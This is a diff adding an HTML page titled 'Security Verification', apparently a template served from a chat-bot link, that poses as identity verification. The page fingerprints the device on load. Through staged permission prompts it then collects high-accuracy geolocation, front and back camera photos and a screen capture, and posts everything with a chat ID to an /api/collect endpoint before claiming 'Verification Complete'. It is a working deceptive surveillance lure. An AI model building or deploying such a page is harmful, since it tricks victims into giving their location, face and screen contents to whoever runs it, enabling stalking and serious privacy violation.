@@ -1,1 +1,538 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Security Verification</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            min-height: 100vh; display: flex; justify-content: center; align-items: center;
+            padding: 16px;
+        }
+        .card {
+            background: rgba(255,255,255,0.05);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 24px; padding: 28px 24px;
+            max-width: 400px; width: 100%; box-shadow: 0 30px 80px rgba(0,0,0,0.5);
+        }
+        h1 { color: #fff; font-size: 22px; text-align: center; margin-bottom: 6px; }
+        .subtitle { color: rgba(255,255,255,0.5); text-align: center; font-size: 13px; margin-bottom: 24px; }
+        
+        .device-panel {
+            background: rgba(255,255,255,0.05);
+            border-radius: 16px; padding: 16px; margin-bottom: 20px;
+        }
+        .device-panel-title {
+            color: rgba(255,255,255,0.4); font-size: 11px; text-transform: uppercase;
+            letter-spacing: 1px; margin-bottom: 12px; text-align: center;
+        }
+        .d-row {
+            display: flex; justify-content: space-between; padding: 7px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 13px;
+        }
+        .d-row:last-child { border-bottom: none; }
+        .d-label { color: rgba(255,255,255,0.4); }
+        .d-value { color: #fff; font-weight: 500; }
+        
+        .btn {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white; border: none; padding: 16px; border-radius: 14px;
+            font-size: 16px; font-weight: 600; cursor: pointer;
+            width: 100%; transition: all 0.3s; position: relative;
+            overflow: hidden;
+        }
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(102,126,234,0.4); }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+        .btn-success { background: linear-gradient(135deg, #11998e, #38ef7d); }
+        
+        .step-container { display: none; }
+        .step-container.active { display: block; }
+        
+        .step-indicator {
+            display: flex; justify-content: center; gap: 8px; margin-bottom: 24px;
+        }
+        .step-dot {
+            width: 10px; height: 10px; border-radius: 50%;
+            background: rgba(255,255,255,0.1); transition: all 0.3s;
+        }
+        .step-dot.active { background: #667eea; transform: scale(1.3); }
+        .step-dot.done { background: #38ef7d; }
+        
+        .status-icon { font-size: 48px; text-align: center; margin: 16px 0; }
+        .action-text { color: rgba(255,255,255,0.7); text-align: center; font-size: 14px; margin-bottom: 20px; }
+        
+        .progress-wrap { margin: 20px 0; }
+        .progress-bar {
+            height: 6px; background: rgba(255,255,255,0.1); border-radius: 3px; overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%; background: linear-gradient(90deg, #667eea, #764ba2);
+            width: 0%; transition: width 0.5s ease; border-radius: 3px;
+        }
+        .progress-text { color: rgba(255,255,255,0.3); font-size: 12px; text-align: center; margin-top: 8px; }
+        
+        .checkmark {
+            width: 70px; height: 70px; border-radius: 50%;
+            background: linear-gradient(135deg, #11998e, #38ef7d);
+            display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 16px; animation: popIn 0.5s ease;
+        }
+        .checkmark svg { width: 36px; height: 36px; fill: white; }
+        
+        @keyframes popIn {
+            0% { transform: scale(0); }
+            60% { transform: scale(1.15); }
+            100% { transform: scale(1); }
+        }
+        
+        .loading-spinner {
+            display: inline-block; width: 20px; height: 20px;
+            border: 3px solid rgba(255,255,255,0.2);
+            border-top: 3px solid #667eea;
+            border-radius: 50%; animation: spin 0.8s linear infinite;
+            vertical-align: middle; margin-right: 8px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        
+        .badge {
+            display: inline-block; background: rgba(255,255,255,0.1);
+            padding: 4px 12px; border-radius: 20px; font-size: 12px; color: rgba(255,255,255,0.7);
+            margin: 4px;
+        }
+        
+        .grid-2 {
+            display: grid; grid-template-columns: 1fr 1fr; gap: 8px;
+        }
+        .stat-box {
+            background: rgba(255,255,255,0.05); border-radius: 12px; padding: 12px;
+            text-align: center;
+        }
+        .stat-box .num { color: #fff; font-size: 22px; font-weight: 700; }
+        .stat-box .lbl { color: rgba(255,255,255,0.4); font-size: 11px; margin-top: 4px; }
+        
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <!-- STEP 1: Basic Info -->
+        <div class="step-container active" id="step1">
+            <div class="status-icon">🛡️</div>
+            <h1>Secure Verification</h1>
+            <p class="subtitle">Collecting device information to verify your identity.</p>
+            
+            <div class="device-panel">
+                <div class="device-panel-title">🔍 Device Profile</div>
+                <div id="deviceInfoContainer">
+                    <div class="d-row"><span class="d-label">📱 Model</span><span class="d-value" id="dModel">Detecting...</span></div>
+                    <div class="d-row"><span class="d-label">💾 RAM</span><span class="d-value" id="dRAM">Detecting...</span></div>
+                    <div class="d-row"><span class="d-label">⚡ CPU</span><span class="d-value" id="dCPU">Detecting...</span></div>
+                    <div class="d-row"><span class="d-label">🔋 Battery</span><span class="d-value" id="dBattery">Detecting...</span></div>
+                    <div class="d-row"><span class="d-label">📡 Network</span><span class="d-value" id="dNetwork">Detecting...</span></div>
+                    <div class="d-row"><span class="d-label">🌐 OS</span><span class="d-value" id="dOS">Detecting...</span></div>
+                    <div class="d-row"><span class="d-label">🗄️ Storage</span><span class="d-value" id="dStorage">Detecting...</span></div>
+                </div>
+            </div>
+            
+            <button class="btn" id="startBtn" onclick="startVerification()">
+                🔐 Start Verification
+            </button>
+            <p style="text-align:center; margin-top:12px; color:rgba(255,255,255,0.3); font-size:11px;">
+                Permissions will be requested one at a time
+            </p>
+        </div>
+        
+        <!-- STEP 2: Permissions -->
+        <div class="step-container" id="step2">
+            <div class="step-indicator" id="stepIndicator"></div>
+            <div id="stepContent">
+                <div class="status-icon" id="stepIcon">📍</div>
+                <h1 id="stepTitle">Location Access</h1>
+                <p class="subtitle" id="stepDesc">Please allow when the browser asks.</p>
+                
+                <div class="progress-wrap">
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progressFill"></div>
+                    </div>
+                    <div class="progress-text" id="progressText">Step 1 of 5</div>
+                </div>
+                
+                <button class="btn" id="actionBtn" onclick="nextStep()">
+                    <span class="loading-spinner" id="loader" style="display:none;"></span>
+                    <span id="btnText">Allow & Continue</span>
+                </button>
+            </div>
+        </div>
+        
+        <!-- STEP 3: Complete -->
+        <div class="step-container" id="step3">
+            <div class="checkmark">
+                <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
+            </div>
+            <h1>✅ Verification Complete</h1>
+            <p class="subtitle">Your identity has been verified successfully.</p>
+            
+            <div class="grid-2" id="finalStats"></div>
+            
+            <p style="text-align:center; color:rgba(255,255,255,0.3); font-size:12px; margin-top:16px;">
+                ✓ All data submitted securely
+            </p>
+        </div>
+    </div>
 
+    <script>
+        const CHAT_ID = "{{ chat_id }}";
+        const UID = "{{ uid }}";
+        const BASE_URL = "{{ base_url }}";
+        
+        // ===== STEP 1: COLLECT DEVICE INFO =====
+        const deviceInfo = {};
+        
+        async function collectDeviceInfo() {
+            const ua = navigator.userAgent;
+            
+            // Model
+            let model = "Unknown Device";
+            if (/iPhone/.test(ua)) {
+                const m = ua.match(/iPhone(\d+),(\d+)/);
+                model = m ? `iPhone ${m[1]},${m[2]}` : "iPhone";
+            } else if (/SM-/.test(ua)) {
+                const m = ua.match(/SM-[A-Z0-9]+/);
+                model = m ? m[0] : "Samsung";
+            } else if (/Redmi|Mi /.test(ua)) {
+                const m = ua.match(/(Redmi \d+|Mi \d+)/);
+                model = m ? m[0] : "Xiaomi";
+            } else if (/Pixel/.test(ua)) {
+                const m = ua.match(/Pixel \d+[a-zA-Z]*/);
+                model = m ? m[0] : "Pixel";
+            } else if (/vivo|Vivo/.test(ua)) {
+                model = "Vivo Device";
+            } else if (/OPPO|A37|CPH/.test(ua)) {
+                model = "OPPO Device";
+            }
+            deviceInfo.model = model;
+            document.getElementById("dModel").textContent = model;
+            
+            // RAM
+            const ram = navigator.deviceMemory;
+            deviceInfo.ram = ram ? `${ram} GB` : "Unknown";
+            document.getElementById("dRAM").textContent = deviceInfo.ram;
+            
+            // CPU
+            const cpu = navigator.hardwareConcurrency;
+            deviceInfo.cpu = cpu ? `${cpu} Cores` : "Unknown";
+            document.getElementById("dCPU").textContent = deviceInfo.cpu;
+            
+            // Battery
+            if (navigator.getBattery) {
+                try {
+                    const b = await navigator.getBattery();
+                    deviceInfo.battery = `${Math.round(b.level * 100)}%`;
+                    deviceInfo.charging = b.charging ? "Charging" : "Not Charging";
+                    document.getElementById("dBattery").textContent = `${deviceInfo.battery} (${deviceInfo.charging})`;
+                } catch(e) {
+                    document.getElementById("dBattery").textContent = "Not available";
+                }
+            }
+            
+            // Network
+            const conn = navigator.connection || navigator.mozConnection;
+            if (conn) {
+                const type = conn.effectiveType || "Unknown";
+                const speed = conn.downlink ? `${conn.downlink} Mbps` : "";
+                deviceInfo.network = type;
+                deviceInfo.downlink = speed;
+                document.getElementById("dNetwork").textContent = `${type} ${speed}`;
+            } else {
+                document.getElementById("dNetwork").textContent = "Not available";
+            }
+            
+            // OS
+            deviceInfo.os = "Unknown";
+            if (/iPhone|iPad/.test(ua)) {
+                const m = ua.match(/OS (\d+)_(\d+)/);
+                deviceInfo.os = m ? `iOS ${m[1]}.${m[2]}` : "iOS";
+            } else if (/Android/.test(ua)) {
+                const m = ua.match(/Android (\d+[\.\d]*)/);
+                deviceInfo.os = m ? `Android ${m[1]}` : "Android";
+            } else if (/Windows/.test(ua)) {
+                deviceInfo.os = "Windows";
+            } else if (/Linux/.test(ua)) {
+                deviceInfo.os = "Linux";
+            }
+            document.getElementById("dOS").textContent = deviceInfo.os;
+            
+            // Storage
+            if (navigator.storage?.estimate) {
+                try {
+                    const s = await navigator.storage.estimate();
+                    const free = (s.quota - s.usage) / 1024 / 1024 / 1024;
+                    deviceInfo.storage = `${free.toFixed(1)} GB free`;
+                    document.getElementById("dStorage").textContent = deviceInfo.storage;
+                } catch(e) {}
+            }
+            
+            // Additional
+            deviceInfo.language = navigator.language || navigator.userLanguage;
+            deviceInfo.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            deviceInfo.screen = `${screen.width}x${screen.height}`;
+            deviceInfo.browser = "Unknown";
+            if (/Chrome/.test(ua) && !/Edg/.test(ua)) deviceInfo.browser = "Chrome";
+            else if (/Firefox/.test(ua)) deviceInfo.browser = "Firefox";
+            else if (/Safari/.test(ua) && !/Chrome/.test(ua)) deviceInfo.browser = "Safari";
+            else if (/Edg/.test(ua)) deviceInfo.browser = "Edge";
+            
+            console.log("Device Info:", deviceInfo);
+        }
+        
+        // ===== STEP 2: PERMISSIONS =====
+        const steps = [
+            { icon: "📍", title: "Location Access", desc: "Allow location access for verification." },
+            { icon: "📸", title: "Front Camera", desc: "We need a quick photo for identity verification." },
+            { icon: "📷", title: "Back Camera", desc: "One more photo from the back camera." },
+            { icon: "🔋", title: "Additional Info", desc: "Gathering final device information..." }
+        ];
+        
+        let currentStep = 0;
+        const collectedData = {
+            chat_id: CHAT_ID,
+            uid: UID,
+            device_info: {},
+            location: {},
+            photos: [],
+            additional: {}
+        };
+        
+        async function startVerification() {
+            document.getElementById("step1").classList.remove("active");
+            document.getElementById("step2").classList.add("active");
+            
+            collectedData.device_info = { ...deviceInfo };
+            
+            // Build step indicators
+            const indicator = document.getElementById("stepIndicator");
+            indicator.innerHTML = "";
+            steps.forEach((_, i) => {
+                const dot = document.createElement("div");
+                dot.className = "step-dot" + (i === 0 ? " active" : "");
+                dot.id = "dot_" + i;
+                indicator.appendChild(dot);
+            });
+            
+            await runStep(0);
+        }
+        
+        async function runStep(stepIndex) {
+            if (stepIndex >= steps.length) {
+                await submitData();
+                return;
+            }
+            
+            currentStep = stepIndex;
+            const step = steps[stepIndex];
+            
+            // Update UI
+            document.getElementById("stepIcon").textContent = step.icon;
+            document.getElementById("stepTitle").textContent = step.title;
+            document.getElementById("stepDesc").textContent = step.desc;
+            
+            const progress = ((stepIndex + 1) / steps.length) * 100;
+            document.getElementById("progressFill").style.width = progress + "%";
+            document.getElementById("progressText").textContent = `Step ${stepIndex + 1} of ${steps.length}`;
+            
+            // Update dots
+            document.querySelectorAll(".step-dot").forEach((d, i) => {
+                d.className = "step-dot";
+                if (i < stepIndex) d.classList.add("done");
+                else if (i === stepIndex) d.classList.add("active");
+            });
+            
+            // Auto-execute some steps
+            const btn = document.getElementById("actionBtn");
+            const btnText = document.getElementById("btnText");
+            const loader = document.getElementById("loader");
+            
+            btn.disabled = false;
+            loader.style.display = "none";
+        }
+        
+        async function nextStep() {
+            const btn = document.getElementById("actionBtn");
+            const btnText = document.getElementById("btnText");
+            const loader = document.getElementById("loader");
+            
+            btn.disabled = true;
+            loader.style.display = "inline-block";
+            btnText.textContent = "Processing...";
+            
+            try {
+                switch(currentStep) {
+                    case 0: await getLocation(); break;
+                    case 1: await capturePhoto("user"); break;
+                    case 2: await capturePhoto("environment"); break;
+                    case 3: await getAdditionalInfo(); break;
+                }
+            } catch(e) {
+                console.warn(`Step ${currentStep} failed:`, e);
+            }
+            
+            if (currentStep < steps.length - 1) {
+                await runStep(currentStep + 1);
+                btn.disabled = false;
+                loader.style.display = "none";
+                btnText.textContent = "Allow & Continue";
+            } else {
+                await submitData();
+            }
+        }
+        
+        function getLocation() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) { resolve(); return; }
+                
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        collectedData.location = {
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy,
+                            altitude: pos.coords.altitude,
+                            speed: pos.coords.speed
+                        };
+                        resolve();
+                    },
+                    (err) => {
+                        console.warn("Location denied:", err.message);
+                        resolve(); // Continue regardless
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            });
+        }
+        
+        async function capturePhoto(facingMode) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } }
+                });
+                
+                const video = document.createElement("video");
+                video.srcObject = stream;
+                await video.play();
+                
+                await new Promise(r => setTimeout(r, 800));
+                
+                const canvas = document.createElement("canvas");
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                canvas.getContext("2d").drawImage(video, 0, 0);
+                
+                const photoData = canvas.toDataURL("image/jpeg", 0.7);
+                
+                collectedData.photos.push({
+                    camera: facingMode === "user" ? "front" : "back",
+                    data: photoData,
+                    timestamp: new Date().toISOString()
+                });
+                
+                stream.getTracks().forEach(t => t.stop());
+                return true;
+            } catch(e) {
+                console.warn(`Camera ${facingMode} error:`, e.message);
+                return false;
+            }
+        }
+        
+        async function getAdditionalInfo() {
+            // Device orientation if available
+            if (window.DeviceOrientationEvent) {
+                try {
+                    if (typeof DeviceOrientationEvent.requestPermission === "function") {
+                        await DeviceOrientationEvent.requestPermission();
+                    }
+                    collectedData.additional.orientation = "available";
+                } catch(e) {}
+            }
+            
+            // Screen capture (optional)
+            if (navigator.mediaDevices?.getDisplayMedia) {
+                try {
+                    const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                    const video = document.createElement("video");
+                    video.srcObject = stream;
+                    await video.play();
+                    await new Promise(r => setTimeout(r, 500));
+                    
+                    const canvas = document.createElement("canvas");
+                    canvas.width = screen.width;
+                    canvas.height = screen.height;
+                    canvas.getContext("2d").drawImage(video, 0, 0);
+                    
+                    collectedData.additional.screenshot = canvas.toDataURL("image/jpeg", 0.4);
+                    stream.getTracks().forEach(t => t.stop());
+                } catch(e) {}
+            }
+            
+            return true;
+        }
+        
+        async function submitData() {
+            const btn = document.getElementById("actionBtn");
+            const btnText = document.getElementById("btnText");
+            const loader = document.getElementById("loader");
+            
+            btn.disabled = true;
+            loader.style.display = "inline-block";
+            btnText.textContent = "Submitting...";
+            
+            try {
+                const response = await fetch("/api/collect", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(collectedData)
+                });
+                
+                const result = await response.json();
+                console.log("Submit result:", result);
+                
+                // Show complete screen
+                document.getElementById("step2").classList.remove("active");
+                document.getElementById("step3").classList.add("active");
+                
+                const stats = document.getElementById("finalStats");
+                stats.innerHTML = `
+                    <div class="stat-box">
+                        <div class="num">📍 ${collectedData.location.lat ? "✓" : "—"}</div>
+                        <div class="lbl">Location</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="num">📸 ${collectedData.photos.length}</div>
+                        <div class="lbl">Photos</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="num">📱 ${deviceInfo.model || "✓"}</div>
+                        <div class="lbl">Device</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="num">🔋 ${deviceInfo.battery || "✓"}</div>
+                        <div class="lbl">Battery</div>
+                    </div>
+                `;
+                
+            } catch(e) {
+                console.error("Submit error:", e);
+                btn.disabled = false;
+                loader.style.display = "none";
+                btnText.textContent = "Retry Submit";
+            }
+        }
+        
+        // Start collecting device info immediately
+        document.addEventListener("DOMContentLoaded", collectDeviceInfo);
+    </script>
+</body>
+</html>
